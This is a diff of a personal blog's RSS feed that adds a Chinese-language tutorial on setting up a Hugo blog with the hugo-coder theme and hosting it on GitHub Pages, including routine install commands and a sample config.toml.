@@ -6,9 +6,434 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>WeepingDogel 本站遵循 CC-BY-NC 4.0 协议</copyright>
-    <lastBuildDate>Sat, 26 Sep 2020 13:14:18 +0800</lastBuildDate>
+    <lastBuildDate>Tue, 13 Oct 2020 20:37:45 +0800</lastBuildDate>
     
         <atom:link href="https://weepingdogel.github.io/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    
+        <item>
+        <title>如何使用 GitHub 搭建博客</title>
+        <link>https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/</link>
+        <pubDate>Tue, 13 Oct 2020 20:37:45 +0800</pubDate>
+        
+        <guid>https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/</guid>
+        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8B/ -&lt;h2 id=&#34;序&#34;&gt;序&lt;/h2&gt;
+&lt;p&gt;去年写过一篇&lt;a href=&#34;https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/&#34;&gt;如何使用GitHub搭建网站&lt;/a&gt;，利用 Github Pages 上传自己写的 HTML 文件来运行一个网页..&lt;/p&gt;
+&lt;p&gt;嘛.. 搭建博客的话，手写 HTML CSS JS 太麻烦了&amp;hellip;&lt;/p&gt;
+&lt;p&gt;怎么办？用框架呀&lt;/p&gt;
+&lt;p&gt;qwq&lt;/p&gt;
+&lt;p&gt;我建议用 Hugo&amp;hellip; 个人觉得最简单&lt;/p&gt;
+&lt;p&gt;正好有个朋友的博客要重建..&lt;/p&gt;
+&lt;h2 id=&#34;注册-github&#34;&gt;注册 Github&lt;/h2&gt;
+&lt;p&gt;首先你得有个 Github 帐号和一个能在 Github Pages 显示的库。&lt;/p&gt;
+&lt;p&gt;去年&lt;a href=&#34;https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/&#34;&gt;那篇&lt;/a&gt;已经写清楚了如何注册 Github 帐号以及创建 Github Pages 库，这里就不再重复了。&lt;/p&gt;
+&lt;p&gt;总之你需要有一个 Github 帐号，然后创建一个名字为这样的库，记得勾选 Public&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;你的GitHub用户名.github.io&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;安装-hugo&#34;&gt;安装 Hugo&lt;/h2&gt;
+&lt;p&gt;接下来安装 Hugo&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Arch&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo pacman -S hugo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;deb 系&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo apt install hugo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Windows&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;到 &lt;a href=&#34;https://github.com/gohugoio/hugo/releases&#34;&gt;Github&lt;/a&gt;下载安装程序即可&lt;/p&gt;
+&lt;h2 id=&#34;生成一个博客&#34;&gt;生成一个博客&lt;/h2&gt;
+&lt;p&gt;我以 Linux 为例，其他平台可能有些细节不同，请&lt;strong&gt;注意&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;打开你的终端，输入&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hugo new site test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来你的终端会返回一些这样的文字&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;Congratulations! Your new Hugo site is created in /home/weepingdogel/test.
+
+Just a few more steps and you&amp;#39;re ready to go:
+
+1. Download a theme into the same-named folder.
+   Choose a theme from https://themes.gohugo.io/ or
+   create your own with the &amp;#34;hugo new theme &amp;lt;THEMENAME&amp;gt;&amp;#34; command.
+2. Perhaps you want to add some content. You can add single files
+   with &amp;#34;hugo new &amp;lt;SECTIONNAME&amp;gt;/&amp;lt;FILENAME&amp;gt;.&amp;lt;FORMAT&amp;gt;&amp;#34;.
+3. Start the built-in live server via &amp;#34;hugo server&amp;#34;.
+
+Visit https://gohugo.io/ for quickstart guide and full documentation.
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个时候你也许知道怎么做了，如果看不太懂英文呢，用 Google Translate 翻译一下:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;恭喜你！ 您的新Hugo网站是在/ home / weepingdogel / test中创建的。
+
+仅需执行几个步骤，您就可以开始：
+
+1.将主题下载到同名文件夹中。
+    从https://themes.gohugo.io/中选择一个主题
+    使用“ hugo新主题&amp;lt;THEMENAME&amp;gt;”命令创建自己的命令。
+2.也许您想添加一些内容。 您可以添加单个文件
+    和“ hugo new &amp;lt;SECTIONNAME&amp;gt; / &amp;lt;FILENAME&amp;gt;。&amp;lt;FORMAT&amp;gt;”。
+3.通过“ hugo服务器”启动内置实时服务器。
+
+请访问https://gohugo.io/以获取快速入门指南和完整文档。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;好的，接下来我们前往 &lt;a href=&#34;https://themes.gohugo.io/&#34;&gt;https://themes.gohugo.io/&lt;/a&gt; 找一个好看的主题。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-10-22_13-31.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里有很多主题，qwq。&lt;/p&gt;
+&lt;p&gt;嗯&amp;hellip; 因人而异，每个人喜欢的都不同。&lt;/p&gt;
+&lt;p&gt;而且各种主题的配置方式也不同，我以 &lt;a href=&#34;https://themes.gohugo.io/hugo-coder/&#34;&gt;hugo-coder&lt;/a&gt; 为例&lt;/p&gt;
+&lt;p&gt;进入 hugo 目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cd test
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看里面的文件&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ls -lh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;总用量 28K
+drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 archetypes/
+-rw-r--r-- 1 weepingdogel weepingdogel   82 10月 22 13:23 config.toml
+drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 content/
+drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 data/
+drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 layouts/
+drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 static/
+drwxr-xr-x 2 weepingdogel weepingdogel 4.0K 10月 22 13:23 themes/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们只需要记住这几个目录&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;config.toml
+&lt;ul&gt;
+&lt;li&gt;博客的配置文件，全局配置&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;static
+&lt;ul&gt;
+&lt;li&gt;静态资源文件，你的图片什么的就可以直接放在这里&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;content
+&lt;ul&gt;
+&lt;li&gt;你写的文章会存储在这个目录下的 &lt;code&gt;posts\&lt;/code&gt; 目录下，其他页面也是在这个目录下&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;themes
+&lt;ul&gt;
+&lt;li&gt;这个是你放主题的目录&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;public
+&lt;ul&gt;
+&lt;li&gt;生成出来的静态文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;然后我们.. 执行这些&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cd theme
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git clone https://github.com/luizdepra/hugo-coder.git 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cd ..
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;接下来将主题里面的 &lt;code&gt;examplesite/config.toml&lt;/code&gt; 复制到 hugo 目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cp ./themes/hugo-coder/exampleSite/config.toml ./ -v
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还要将 &lt;code&gt;examplesite/content&lt;/code&gt; 目录下的东西也复制到外面这个 &lt;code&gt;content&lt;/code&gt; 目录里面&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ cp -rv ./themes/hugo-coder/exampleSite/content/* content/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;启动本地预览服务器&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ hugo server 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后通过浏览器访问 &lt;code&gt;http://127.0.0.1:1313/&lt;/code&gt; 即可预览&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/2020-10-22_13-53.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这样一来，博客在本地就可以访问了，算是成功了一半。&lt;/p&gt;
+&lt;p&gt;你可以修改&lt;code&gt;config.toml&lt;/code&gt;这个文件来更改你的博客配置&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ vim config.toml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-toml&#34; data-lang=&#34;toml&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;baseurl&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://www.example.com&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;johndoe&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 博客标题&lt;/span&gt;
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;theme&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hugo-coder&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 主题名称，不需要动&lt;/span&gt;
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;languagecode&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 语言，默认英文..&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;defaultcontentlanguage&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;en&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 同上&lt;/span&gt;
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;paginate&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;pygmentsstyle&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;b2&amp;#34;&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;pygmentscodefences&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;span style=&#34;color:#a6e22e&#34;&gt;pygmentscodefencesguesssyntax&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+
+&lt;span style=&#34;color:#a6e22e&#34;&gt;disqusShortname&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yourdiscussshortname&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;## 基本信息，自己谷歌翻译吧... qwq&lt;/span&gt;
+[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;author&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;John Doe&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;description&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;John Doe&amp;#39;s personal website&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;keywords&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;blog,developer,personal&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Full Stack DevOps and Magician&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;avatarurl&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;images/avatar.jpg&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;#gravatar = &amp;#34;john.doe@example.com&amp;#34; &lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;footercontent&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter a text here.&amp;#34;&lt;/span&gt;
+
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;dateformat&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;January 2, 2006&amp;#34;&lt;/span&gt;
+
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideFooter&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideCredits&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideCopyright&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;since&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Git Commit in Footer，取消注释下面的行以启用它。&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;commit&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://github.com/luizdepra/hugo-coder/tree/&amp;#34;&lt;/span&gt;
+
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;rtl&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Specify light/dark colorscheme&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Supported values:&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;auto&amp;#34; (use preference set by browser)&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;dark&amp;#34; (dark background, light foreground)&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;light&amp;#34; (light background, dark foreground) (default)&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;colorscheme&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;auto&amp;#34;&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 隐藏切换按钮以及相关的垂直分隔线&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;hidecolorschemetoggle&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 系列，另见帖子数&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;maxSeeAlsoItems&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 启用Twemoji&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;enableTwemoji&lt;/span&gt; = &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 自定义CSS&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;customCSS&lt;/span&gt; = []
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 自定义SCSS&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;customSCSS&lt;/span&gt; = []
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 自定义JS&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;customJS&lt;/span&gt; = []
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 如果要使用 fathom（https://usefathom.com）进行分析，请添加此部分&lt;/span&gt;
+[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;fathomAnalytics&lt;/span&gt;]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;siteID&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCDE&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 默认值为cdn.usefathom.com，如果您是自托管主机，则将其覆盖&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;serverURL&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;analytics.example.com&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 如果要使用 plausible（https://plausible.io）进行分析，请添加此部分&lt;/span&gt;
+[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;plausibleAnalytics&lt;/span&gt;]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;domain&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;example.com&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# 默认值为plausible.io，如果您是自托管或使用自定义域，请覆盖此默认值&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;serverURL&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;analytics.example.com&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# 如果要使用山羊计数（https://goatcounter.com）进行分析，请添加此部分&lt;/span&gt;
+[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;goatCounter&lt;/span&gt;]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;code&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;code&amp;#34;&lt;/span&gt;
+
+[&lt;span style=&#34;color:#a6e22e&#34;&gt;taxonomies&lt;/span&gt;]
+  &lt;span style=&#34;color:#a6e22e&#34;&gt;category&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;categories&amp;#34;&lt;/span&gt;
+  &lt;span style=&#34;color:#a6e22e&#34;&gt;series&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;series&amp;#34;&lt;/span&gt;
+  &lt;span style=&#34;color:#a6e22e&#34;&gt;tag&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tags&amp;#34;&lt;/span&gt;
+  &lt;span style=&#34;color:#a6e22e&#34;&gt;author&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;authors&amp;#34;&lt;/span&gt;
+
+[[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;social&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Github&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;icon&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-github&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://github.com/johndoe/&amp;#34;&lt;/span&gt;
+[[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;social&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Gitlab&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;icon&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-gitlab&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://gitlab.com/johndoe/&amp;#34;&lt;/span&gt;
+[[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;social&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Twitter&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;icon&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-twitter&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://twitter.com/johndoe/&amp;#34;&lt;/span&gt;
+[[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;social&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LinkedIn&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;icon&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-linkedin&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://www.linkedin.com/in/johndoe/&amp;#34;&lt;/span&gt;
+[[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;social&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Medium&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;icon&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-medium&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://medium.com/@johndoe&amp;#34;&lt;/span&gt;
+[[&lt;span style=&#34;color:#a6e22e&#34;&gt;params&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;social&lt;/span&gt;]]
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;RSS&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;icon&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fa fa-rss&amp;#34;&lt;/span&gt;
+    &lt;span style=&#34;color:#a6e22e&#34;&gt;weight&lt;/span&gt; = &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;
